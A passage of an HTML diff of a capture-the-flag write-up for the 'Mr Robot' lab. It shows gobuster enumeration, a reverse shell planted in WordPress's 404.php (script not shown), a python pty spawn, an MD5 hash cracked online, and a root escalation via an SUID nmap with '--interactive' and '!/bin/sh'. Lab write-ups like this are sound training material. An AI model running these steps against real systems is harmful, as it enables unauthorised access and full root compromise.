+</span></span><span style="display:flex;"><span>/readme               <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 64<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/rdf                  <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/feed/rdf/<span style="color:#000">]</span>   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/robots               <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 41<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/robots.txt           <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 41<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/rss                  <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span style="color:#000">]</span>       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/rss2                 <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span style="color:#000">]</span>       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/sitemap              <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/sitemap.xml          <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/video                <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 235<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/video/<span style="color:#000">]</span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-admin             <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 238<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-admin/<span style="color:#000">]</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-content           <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 240<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-content/<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-includes          <span style="color:#000">(</span>Status: 301<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 241<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-includes/<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-cron              <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-config            <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-links-opml        <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 227<span style="color:#000">]</span>                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-load              <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-login             <span style="color:#000">(</span>Status: 200<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 2613<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-mail              <span style="color:#000">(</span>Status: 500<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 3064<span style="color:#000">]</span>                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-settings          <span style="color:#000">(</span>Status: 500<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span>                                          
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/wp-signup            <span style="color:#000">(</span>Status: 302<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 0<span style="color:#000">]</span> <span style="color:#000">[</span>--&gt; http://&lt;target-ip&gt;/wp-login.php?action<span style="color:#000">=</span>register<span style="color:#000">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/xmlrpc               <span style="color:#000">(</span>Status: 405<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 42<span style="color:#000">]</span>                                                       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/xmlrpc.php           <span style="color:#000">(</span>Status: 405<span style="color:#000">)</span> <span style="color:#000">[</span>Size: 42<span style="color:#000">]</span>                                                       
+</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/05/10 12:24:21 <span style="color:#000">Finished</span>
+</span></span><span style="display:flex;"><span><span style="color:#000">===============================================================</span>
 </span></span></code></pre></div><p>From this, we can be confident that WordPress is installed. This also mirrors what <a href="">Wappalyzer</a> tells us about the server&rsquo;s WordPress installation. Let&rsquo;s investigate some of the more interesting results from our <code>gobuster</code> scan.</p>
 <p>Visiting <code>http://&lt;target-ip&gt;/robots.txt</code> yields:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">User-agent: *
-</span></span><span class="line"><span class="cl">fsocity.dic
-</span></span><span class="line"><span class="cl">key-1-of-3.txt
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>User-agent: *
+</span></span><span style="display:flex;"><span>fsocity.dic
+</span></span><span style="display:flex;"><span>key-1-of-3.txt
 </span></span></code></pre></div><p><code>fsocity.dic</code> is a dictionary wordlist file with many entries. This most likely contains the username and/or password of the WordPress installation.</p>
 <p><code>key-1-of-3.txt</code> has our first flag.</p>
 <p><code>http://&lt;target-ip&gt;/license</code> gives us a text file with the following string hidden at the bottom. At first flance, the string looks a lot like <code>base64</code>, so let us try to convert it. This could be done via websites like <a href="https://www.base64decode.org/">www.base64.decode.org</a>, but I already had Burp Suite open. It works:</p>
@@ -321,67 +316,67 @@
 <p>However, we know that WordPress relies on the execution of <code>.php</code> files to carry out work properly. Thus, we can simply use the platform&rsquo;s built-in text editor to replace the contents of an existing <code>.php</code> WordPress page with our reverse shell script. I went ahead and used <code>404.php</code>, as it is easily accessible and, honestly, it&rsquo;s just at the top of the list.</p>
 <p><img src="https://robscharf.github.io/images/mr-robot/mr-robot-ptm.png" alt="mr-robot-ptm"></p>
 <p>That worked nicely! We can then stabilize our shell via python with:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span class="line"><span class="cl">daemon@linux:/$ 
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python -c <span style="color:#c41a16">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>daemon@linux:/$ 
 </span></span></code></pre></div><p>and explore:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">daemon@linux:/$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
-</span></span><span class="line"><span class="cl">boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
-</span></span><span class="line"><span class="cl">daemon@linux:/$ <span class="nb">cd</span> home 
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> home
-</span></span><span class="line"><span class="cl">daemon@linux:/home$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">robot
-</span></span><span class="line"><span class="cl">daemon@linux:/home$ <span class="nb">cd</span> robot
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> robot
-</span></span><span class="line"><span class="cl">daemon@linux:/home/robot$ ls
-</span></span><span class="line"><span class="cl">ls
-</span></span><span class="line"><span class="cl">key-2-of-3.txt	password.raw-md5
-</span></span><span class="line"><span class="cl">daemon@linux:/home/robot$ ls -la
-</span></span><span class="line"><span class="cl">ls -la
-</span></span><span class="line"><span class="cl">total <span class="m">16</span>
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
-</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> ..
-</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> robot robot   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-2-of-3.txt
-</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> robot robot   <span class="m">39</span> Nov <span class="m">13</span>  <span class="m">2015</span> password.raw-md5
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>daemon@linux:/$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
+</span></span><span style="display:flex;"><span>boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
+</span></span><span style="display:flex;"><span>daemon@linux:/$ <span style="color:#a90d91">cd</span> home 
+</span></span><span style="display:flex;"><span><span style="color:#a90d91">cd</span> home
+</span></span><span style="display:flex;"><span>daemon@linux:/home$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>robot
+</span></span><span style="display:flex;"><span>daemon@linux:/home$ <span style="color:#a90d91">cd</span> robot
+</span></span><span style="display:flex;"><span><span style="color:#a90d91">cd</span> robot
+</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ ls
+</span></span><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>key-2-of-3.txt	password.raw-md5
+</span></span><span style="display:flex;"><span>daemon@linux:/home/robot$ ls -la
+</span></span><span style="display:flex;"><span>ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#1c01ce">16</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#1c01ce">2</span> root  root  <span style="color:#1c01ce">4096</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#1c01ce">3</span> root  root  <span style="color:#1c01ce">4096</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> ..
+</span></span><span style="display:flex;"><span>-r-------- <span style="color:#1c01ce">1</span> robot robot   <span style="color:#1c01ce">33</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> key-2-of-3.txt
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#1c01ce">1</span> robot robot   <span style="color:#1c01ce">39</span> Nov <span style="color:#1c01ce">13</span>  <span style="color:#1c01ce">2015</span> password.raw-md5
 </span></span></code></pre></div><p>We can&rsquo;t read <code>key-2-of-3.txt</code> yet, but we can access <code>password.raw-md5</code> for a hashed version of a password, likely for the <code>robot</code> user. We can use <a href="https://crackstation.net/">crackstation.net</a> to crack it, and, if not, probaby <a href="https://www.openwall.com/john/">John the Ripper</a>.</p>
 <p>Luckily, crackstation.net recognizes the hash and gives us the decoded password:</p>
 <p><img src="https://robscharf.github.io/media/mr-robot-crackstation.png" alt="mr-robot-crackstation"></p>
 <p>We can now switch users (<code>su</code>) to <code>robot</code> and read <code>key-2-of-3.txt</code>. Now that we have gotten the second flag, let&rsquo;s look to escalate our privileges for <code>root</code> access and, presumably, the third flag.</p>
 <p>As a shortcut to obtaining root access, We can search for system files that have an SUID (Set User ID) bit set. Files with SUID bits allow them to run with the permissions of whomever the owner of the file is. If the owner happens to be <code>root</code>, it runs with root permissions.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">robot@linux:/tmp$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
-</span></span><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
-</span></span><span class="line"><span class="cl">/bin/ping
-</span></span><span class="line"><span class="cl">/bin/umount
-</span></span><span class="line"><span class="cl">/bin/mount
-</span></span><span class="line"><span class="cl">/bin/ping6
-</span></span><span class="line"><span class="cl">/bin/su
-</span></span><span class="line"><span class="cl">/usr/bin/passwd
-</span></span><span class="line"><span class="cl">/usr/bin/newgrp
-</span></span><span class="line"><span class="cl">/usr/bin/chsh
-</span></span><span class="line"><span class="cl">/usr/bin/chfn
-</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
-</span></span><span class="line"><span class="cl">/usr/bin/sudo
-</span></span><span class="line"><span class="cl">/usr/local/bin/nmap
-</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
-</span></span><span class="line"><span class="cl">/usr/lib/eject/dmcrypt-get-device
-</span></span><span class="line"><span class="cl">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-</span></span><span class="line"><span class="cl">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-</span></span><span class="line"><span class="cl">/usr/lib/pt_chown
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>robot@linux:/tmp$ find / -perm -u<span style="color:#000">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>find / -perm -u<span style="color:#000">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/bin/ping
+</span></span><span style="display:flex;"><span>/bin/umount
+</span></span><span style="display:flex;"><span>/bin/mount
+</span></span><span style="display:flex;"><span>/bin/ping6
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/local/bin/nmap
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+</span></span><span style="display:flex;"><span>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+</span></span><span style="display:flex;"><span>/usr/lib/pt_chown
 </span></span></code></pre></div><p>We see that <code>nmap</code> in <code>/usr/local/bin/nmap</code>, interestingly, has an SUID bit set. Nice.</p>
 <p>By checking <a href="https://gtfobins.github.io/gtfobins/nmap/#suid">GTFOBins</a> for <code>nmap</code> SUID escalations, we see that we can invoke <code>nmap</code>&rsquo;s &ldquo;interactive mode&rdquo; (available on versions 2.02 to 5.21, which can be used to execute shell commands via <code>nmap&gt; !sh</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">robot@linux:/$ /usr/local/bin/nmap --interactive
-</span></span><span class="line"><span class="cl">/usr/local/bin/nmap --interactive
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Starting nmap V. 3.81 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span>
-</span></span><span class="line"><span class="cl">Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="k">for</span> <span class="nb">help</span>
-</span></span><span class="line"><span class="cl">nmap&gt; !/bin/sh
-</span></span><span class="line"><span class="cl">!/bin/sh
-</span></span><span class="line"><span class="cl"><span class="c1"># whoami</span>
-</span></span><span class="line"><span class="cl">whoami
-</span></span><span class="line"><span class="cl">root
-</span></span><span class="line"><span class="cl"><span class="c1"># </span>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>robot@linux:/$ /usr/local/bin/nmap --interactive
+</span></span><span style="display:flex;"><span>/usr/local/bin/nmap --interactive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting nmap V. 3.81 <span style="color:#000">(</span> http://www.insecure.org/nmap/ <span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>Welcome to Interactive Mode -- press h &lt;enter&gt; <span style="color:#a90d91">for</span> <span style="color:#a90d91">help</span>
+</span></span><span style="display:flex;"><span>nmap&gt; !/bin/sh
+</span></span><span style="display:flex;"><span>!/bin/sh
+</span></span><span style="display:flex;"><span><span style="color:#177500"># whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span><span style="color:#177500"># </span>
 </span></span></code></pre></div><p>&hellip;<em>et voilà</em>! We have root access and, by extension, the third flag.</p>
 <h3 id="notes">Notes</h3>
 <p>In retrospect, I would&rsquo;ve checked my Wappalyzer browser plug-in earlier, which is a good practice to prioritize. It would have spotted that WordPress is installed on the server before the lengthy <code>gobuster</code> scan, potentially saving time.</p>
